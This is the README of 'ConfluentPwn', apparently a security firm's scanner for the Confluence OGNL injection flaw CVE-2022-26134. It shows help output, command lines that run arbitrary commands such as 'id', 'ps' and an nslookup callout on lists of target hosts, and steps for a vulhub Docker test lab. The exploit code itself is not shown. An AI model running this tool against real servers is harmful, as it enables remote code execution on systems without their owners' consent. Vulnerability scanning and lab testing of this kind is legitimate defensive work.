# ConfluentPwn
Confluence pre-auth ONGL injection remote code execution scanner (CVE-2022-26134).

## Usage
Here is the help output of the tool:
```
$ ./cfscan -h

  +-------------------------------+
  |    C O N F L U E N T P W N    |
  +-------------------------------+

[+] ConfluentPwn by RedHunt Labs - A Modern Attack Surface (ASM) Management Company
[+] Author: Pinaki Mondal (RHL Research Team)
[+] Continuously Track Your Attack Surface using https://redhuntlabs.com/nvadr.

Usage:
  -cmd string
        Command to execute on a vulnerable confluence server. (default "id")
  -file string
        Specify a file containing list of hosts to scan.
  -output string
        Output filepath to write the scan results into. (default "cfpwn-results.csv")
  -regex string
        Regex to match the response header for the command executed.
  -threads int
        Number of threads to use while scanning. (default 20)
  -timeout int
        HTTP timeout in seconds. (default 5)
  -user-agent string
        Custom user-agent string to use. (default "Mozilla/5.0 (ConfluentPwn) Chrome/95.0.4638.69 Safari/537.36")

Examples:
  ./cfscan 1.2.3.4:80 1.1.1.1:8080
  ./cfscan -file urls.txt
  ./cfscan -cmd 'nslookup xxxxxxxxxxxxxxxxx.canarytokens.com 1.1.1.1:80'
  ./cfscan -cmd 'ps' -regex '^\s*PID\s*TTY\s*TIME\s*CMD' http://1.1.1.1:443
```

### Specifying targets
Targets can be specified in two ways:
- Specifying URLs directly via command line.
    ```
    ./cfscan target1 target2 ...
    ```
- Specifying a file containing a list of URLs to scan using the `-file` argument.
    ```
    ./cfscan -file targets.txt
    ```

### Concurrency, timeouts and user-agents
Maximum number of concurrent targets to be processed can be controlled using the `-threads` argument. The default concurrency value is 20.

HTTP timeout value in seconds can be can be specified using the `-timeout` argument. The default timeout is set to 5 seconds.

Custom user-agent can be specified using the `-user-agent` flag, in-case the user wants to track UA strings in their logs.

### Output
The output generated is written to a CSV file, the destination of which can be specified using the `-output` flag. The default output file generated is `cfscan-results.csv`.

The output contains 4 columns:
- target
- confluence version
- vulnerability status
- command output

### Command Specification & Matching
The command to be run on a vulnerable server can be specified using the `-cmd` argument. A regular expression is specified to match the output of the command -- which can be mentioned using the `-regex` flag.

The default command which is run is the `id`, and the regex used to match the output of the command is `uid=\d+?\(\w+?\)\s*?gid=\d+?\(\w+?\)\s*groups=\d+?\(\w+?\)`.

Using the flags together looks like:
```
./cfscan -cmd 'id' -regex 'uid=\d+?\(\w+?\)\s*?gid=\d+?\(\w+?\)\s*groups=\d+?\(\w+?\)' https://1.1.1.1
./cfscan -cmd 'ps' -regex '^\s*PID\s*TTY\s*TIME\s*CMD' http://1.1.1.1:443
```

### Setting up a Test Environment
If you'd like to test out the tool or the vulnerability in general, then you can refer to this: [https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2022-26134](https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2022-26134).

The installation process is quite simple, the below commands do the job:
```
$ mkdir confluentpwn && cd confluentpwn && wget https://raw.githubusercontent.com/vulhub/vulhub/master/confluence/CVE-2022-26134/docker-compose.yml
$ docker-compose up -d
```
The app should now be available at `http://localhost:8090`.

### License & Version
The tool is licensed under the MIT license. See [LICENSE](LICENSE).
Currently the tool is at v0.1.

### Credits
The Research Team at [RedHunt Labs](https://redhuntlabs.com) would like to thank [vulhub](https://github.com/vulhub/vulhub) for providing the docker test image.

##### **[`To know more about our Attack Surface Management platform, check out NVADR.`](https://redhuntlabs.com/nvadr)**